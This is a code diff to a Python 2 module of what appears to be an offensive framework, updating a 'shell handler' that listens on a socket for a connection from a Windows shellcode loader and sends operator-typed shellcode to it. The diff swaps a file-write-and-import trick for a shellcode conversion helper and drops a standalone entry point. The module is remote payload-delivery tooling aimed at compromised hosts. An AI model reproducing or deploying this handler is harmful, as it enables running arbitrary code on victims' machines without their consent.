@@ -13,8 +13,8 @@ docs = '''
 #description            :shell handler send,Shellocde保持4096字节以内，不能过大
 详细参见博客：http://imosin.com/2017/10/22/shellcode-used/
 #author                 :mosin
-#date                   :20170917
-#version                :0.1
+#date                   :20190424
+#version                :0.2
 #usage                   send:> qiut    #退出监听，返回框架
 
 #python_version         :2.7.5
@@ -27,7 +27,7 @@ USE MODULE =>payload\windows\shellcode_loader x64
 '''
 
 from modules.exploit import BGExploit
-
+from lib.ple.module.getshellcode import GetShellcode
 
 class PLScan(BGExploit):
     
@@ -105,23 +105,19 @@ class PLScan(BGExploit):
         #开始监听
         print "Handler Listening %s port:%s" %(HOST,PORT)
         
-        f1 = open('lib/get_shellcode.py','w')
-        
         while STOP_CHAT:
             conn, addr=sock.accept()
             print('Start Listening From %s  port %s.....') %(addr,PORT)
             while True:
-                data = raw_input('shellcode:> ')
-                if data =="":
+                datas = raw_input('shellcode:> ')
+                if datas =="":
                     continue
-                data = "data = \"" + data + "\""
-                f1.write(data)
-                f1.close()
-                from lib.get_shellcode import data
+                cover_shellcode = GetShellcode(datas).coverdata()
+                
                 try:
-                    if data == "quit":
+                    if datas == "quit":
                         break
-                    conn.send(data)
+                    conn.send(cover_shellcode)
                     break
                 except:
                     conn.close()
@@ -129,8 +125,4 @@ class PLScan(BGExploit):
             STOP_CHAT = False
                 
         sock.close()
-#下面为单框架程序执行，可以省略
-if __name__ == '__main__':
-    from main import main
-    main(PLScan())
-
+        
